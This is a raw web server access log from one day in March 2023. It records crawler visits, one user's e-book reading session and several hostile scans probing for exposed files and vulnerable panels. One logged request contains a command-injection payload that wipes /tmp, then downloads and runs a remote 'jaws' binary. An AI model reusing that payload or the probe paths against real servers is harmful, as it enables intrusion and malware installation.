45.81.243.34 - - [27/Mar/2023:00:09:34 +0000] "{D79E94C5-70F0-46BD-965B-E17497CCB598}" 400 157 "-" "-"
116.203.49.13 - - [27/Mar/2023:00:26:50 +0000] "GET /.git/config HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
116.203.49.13 - - [27/Mar/2023:00:26:50 +0000] "GET /.git/config HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [27/Mar/2023:00:26:55 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.54 - - [27/Mar/2023:00:50:45 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
40.77.167.93 - - [27/Mar/2023:01:18:47 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.94 - - [27/Mar/2023:01:20:01 +0000] "GET / HTTP/1.1" 200 796 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
167.94.138.52 - - [27/Mar/2023:01:22:00 +0000] "GET / HTTP/1.1" 200 5190 "-" "-"
167.94.138.52 - - [27/Mar/2023:01:22:00 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.52 - - [27/Mar/2023:01:22:01 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.138.52 - - [27/Mar/2023:01:22:01 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
1.34.229.91 - - [27/Mar/2023:01:22:50 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" 499 0 "-" "Hello, world"
143.110.222.166 - - [27/Mar/2023:01:25:42 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2a06:4880:7000::8b - - [27/Mar/2023:01:31:36 +0000] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
157.55.39.225 - - [27/Mar/2023:01:47:24 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.172 - - [27/Mar/2023:01:47:34 +0000] "GET / HTTP/1.1" 200 1707 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
92.118.39.82 - - [27/Mar/2023:01:48:26 +0000] "GET / HTTP/1.1" 200 214065 "-" "-"
92.118.39.82 - - [27/Mar/2023:01:48:26 +0000] "GET /cgi-bin/downloadFlile.cgi HTTP/1.1" 404 0 "-" "Hello World"
52.167.144.135 - - [27/Mar/2023:01:48:37 +0000] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.135 - - [27/Mar/2023:01:48:37 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.239 - - [27/Mar/2023:01:48:39 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
152.89.196.54 - - [27/Mar/2023:01:55:58 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
40.77.167.170 - - [27/Mar/2023:02:11:02 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.239 - - [27/Mar/2023:02:13:32 +0000] "GET / HTTP/1.1" 200 1010 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
71.6.232.27 - - [27/Mar/2023:02:15:27 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
52.167.144.172 - - [27/Mar/2023:02:25:37 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [27/Mar/2023:02:26:46 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
147.78.47.249 - - [27/Mar/2023:02:30:08 +0000] "GET /_ignition/health-check/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
147.78.47.249 - - [27/Mar/2023:02:30:10 +0000] "GET /public/_ignition/health-check/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
147.78.47.249 - - [27/Mar/2023:02:30:12 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
40.77.167.170 - - [27/Mar/2023:02:31:54 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
179.43.177.242 - - [27/Mar/2023:02:41:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 0 "http://208.76.222.31:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
179.43.177.242 - - [27/Mar/2023:02:41:30 +0000] "" 400 0 "-" "-"
94.102.61.10 - - [27/Mar/2023:02:42:10 +0000] "GET / HTTP/1.1" 200 415868 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
45.11.57.48 - - [27/Mar/2023:02:50:43 +0000] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
52.167.144.58 - - [27/Mar/2023:03:01:14 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.208 - - [27/Mar/2023:03:02:55 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
71.6.232.28 - - [27/Mar/2023:03:18:05 +0000] "GET / HTTP/1.1" 200 237190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
157.55.39.208 - - [27/Mar/2023:03:19:17 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.170 - - [27/Mar/2023:03:22:18 +0000] "GET / HTTP/1.1" 200 605 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [27/Mar/2023:03:27:10 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
40.77.167.94 - - [27/Mar/2023:03:28:06 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
51.222.253.5 - - [27/Mar/2023:03:39:49 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.252 - - [27/Mar/2023:03:39:51 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.148 - - [27/Mar/2023:03:39:58 +0000] "GET /IMAGES/gnubanner.gif HTTP/1.1" 200 2177 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.38 - - [27/Mar/2023:03:40:00 +0000] "GET /IMAGES/firefox3.gif HTTP/1.1" 200 3009 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.81 - - [27/Mar/2023:03:40:01 +0000] "GET /IMAGES/nokia64.gif HTTP/1.1" 200 558 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.149.40 - - [27/Mar/2023:03:40:01 +0000] "GET /IMAGES/vi.gif HTTP/1.1" 200 5815 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.29 - - [27/Mar/2023:03:40:05 +0000] "GET /IMAGES/2019.gif HTTP/1.1" 200 1629 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.157 - - [27/Mar/2023:03:40:09 +0000] "GET /CSS/style.css HTTP/1.1" 200 1157 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
102.67.228.181 - - [27/Mar/2023:03:51:08 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
52.167.144.172 - - [27/Mar/2023:03:51:25 +0000] "GET / HTTP/1.1" 200 1029 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
184.105.247.254 - - [27/Mar/2023:03:54:05 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"
184.105.247.254 - - [27/Mar/2023:04:01:00 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)"
184.105.247.254 - - [27/Mar/2023:04:03:19 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56"
184.105.247.254 - - [27/Mar/2023:04:06:14 +0000] "GET /geoserver/web/ HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0"
184.105.247.254 - - [27/Mar/2023:04:07:21 +0000] "GET /.git/config HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
27.124.12.23 - - [27/Mar/2023:04:08:23 +0000] "GET /movie/16876.html HTTP/1.1" 404 153 "/movie/16876.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
35.240.121.17 - - [27/Mar/2023:04:09:41 +0000] "GET / HTTP/1.1" 200 1583 "-" "python-requests/2.28.2"
180.101.233.207 - - [27/Mar/2023:04:11:32 +0000] "GET /dump.sql HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
40.77.167.94 - - [27/Mar/2023:04:12:18 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.58 - - [27/Mar/2023:04:15:51 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
144.126.196.27 - - [27/Mar/2023:04:19:51 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x03\x1B\xAF\x8C5\x19\x84~\xF1\xDB)\x8F28\xF6N\xBB\x84a\xED\x9A\xAF\xD0\x14\x83" 400 157 "-" "-"
144.126.196.27 - - [27/Mar/2023:04:19:51 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03VEupf\xDCD\xCA\xF6O4-P\x12\x00\x85\x7F/:\x1A#\xFA\xF6\xDF.\x89\xF5\xF9\xE0\xBF\xBEn\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
144.126.196.27 - - [27/Mar/2023:04:19:52 +0000] "GET / HTTP/1.1" 200 415812 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
144.126.196.27 - - [27/Mar/2023:04:19:52 +0000] "GET /client/get_targets HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
144.126.196.27 - - [27/Mar/2023:04:19:52 +0000] "GET /upl.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
144.126.196.27 - - [27/Mar/2023:04:19:52 +0000] "GET /t4 HTTP/1.1" 404 125 "-" "Mozilla/5.0"
144.126.196.27 - - [27/Mar/2023:04:19:52 +0000] "GET /geoip/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
144.126.196.27 - - [27/Mar/2023:04:19:52 +0000] "GET / HTTP/1.1" 200 415812 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
40.77.167.239 - - [27/Mar/2023:04:20:14 +0000] "GET / HTTP/1.1" 200 587 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [27/Mar/2023:04:24:44 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.222.253.10 - - [27/Mar/2023:04:30:53 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.108 - - [27/Mar/2023:04:30:55 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
157.55.39.208 - - [27/Mar/2023:05:14:19 +0000] "GET / HTTP/1.1" 200 865 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
64.227.99.233 - - [27/Mar/2023:05:17:35 +0000] "\x00\x0E89J\xEA\x09\x11f\xB2\xD4\x00\x00\x00\x00\x00" 400 157 "-" "-"
54.36.148.211 - - [27/Mar/2023:05:18:22 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.33 - - [27/Mar/2023:05:18:26 +0000] "GET /posts/pseudopost-7/pseudopost-7.html HTTP/1.1" 200 2585 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.109 - - [27/Mar/2023:05:18:30 +0000] "GET /posts/pseudopost-7/images/parigi.jpeg HTTP/1.1" 200 317835 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
143.110.222.166 - - [27/Mar/2023:05:27:13 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
139.162.160.20 - - [27/Mar/2023:05:34:11 +0000] "GET /YjTE HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
139.162.160.20 - - [27/Mar/2023:05:34:11 +0000] "GET /KChg HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.105.20.227 - - [27/Mar/2023:05:34:12 +0000] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00" 400 157 "-" "-"
172.105.20.227 - - [27/Mar/2023:05:34:12 +0000] "GET /9iUe HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.105.20.227 - - [27/Mar/2023:05:34:12 +0000] "GET /TwGK HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
143.110.222.166 - - [27/Mar/2023:06:25:58 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
161.35.230.3 - - [27/Mar/2023:06:26:12 +0000] "\x00\x0E8I\xA0p\x98\xF6\xFD\x8C4\x00\x00\x00\x00\x00" 400 157 "-" "-"
46.193.1.170 - - [27/Mar/2023:06:34:35 +0000] "GET / HTTP/1.1" 200 415971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:36 +0000] "GET /ajax-setup?1679898910601 HTTP/1.1" 200 75 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:36 +0000] "GET /interface-data/update?1679898910642 HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:36 +0000] "GET /interface-data/books-init?library_id=books&sort=timestamp.desc&1679898910647 HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:41 +0000] "GET /book-get-annotations/books/82-PDF_58-PDF_80-EPUB?1679898915707 HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:41 +0000] "GET /interface-data/update?1679898910642 HTTP/1.1" 200 1064 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:41 +0000] "GET /book-get-annotations/books/82-PDF_58-PDF_80-EPUB?1679898915707 HTTP/1.1" 200 1837 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:41 +0000] "GET /interface-data/books-init?library_id=books&sort=timestamp.desc&1679898910647 HTTP/1.1" 200 6818 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:42 +0000] "POST /interface-data/set-session-data HTTP/1.1" 200 4 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:44 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:44 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:34:45 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:35:05 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:35:06 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:39:09 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:39:10 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:39:12 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:39:13 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:39:24 +0000] "POST /book-update-annotations/books/82/PDF HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:06:39:24 +0000] "POST /book-update-annotations/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:06:53 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
185.225.74.42 - - [27/Mar/2023:07:08:43 +0000] "GET / HTTP/1.1" 200 196505 "-" "Linux Gnu (cow)"
125.31.58.170 - - [27/Mar/2023:07:09:57 +0000] "GET /test.sql HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
46.193.1.170 - - [27/Mar/2023:07:10:07 +0000] "POST /book-update-annotations/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:10:36 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
34.221.106.180 - - [27/Mar/2023:07:15:22 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
46.193.1.170 - - [27/Mar/2023:07:16:39 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
34.216.38.30 - - [27/Mar/2023:07:16:48 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.216.38.30 - - [27/Mar/2023:07:16:49 +0000] "GET / HTTP/1.1" 200 415716 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
46.193.1.170 - - [27/Mar/2023:07:19:41 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:22:35 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [27/Mar/2023:07:26:03 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
54.186.90.105 - - [27/Mar/2023:07:26:28 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
143.110.222.166 - - [27/Mar/2023:07:27:03 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
46.193.1.170 - - [27/Mar/2023:07:28:38 +0000] "POST /book-set-last-read-position/books/82/PDF HTTP/1.1" 200 0 "http://208.76.222.31/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
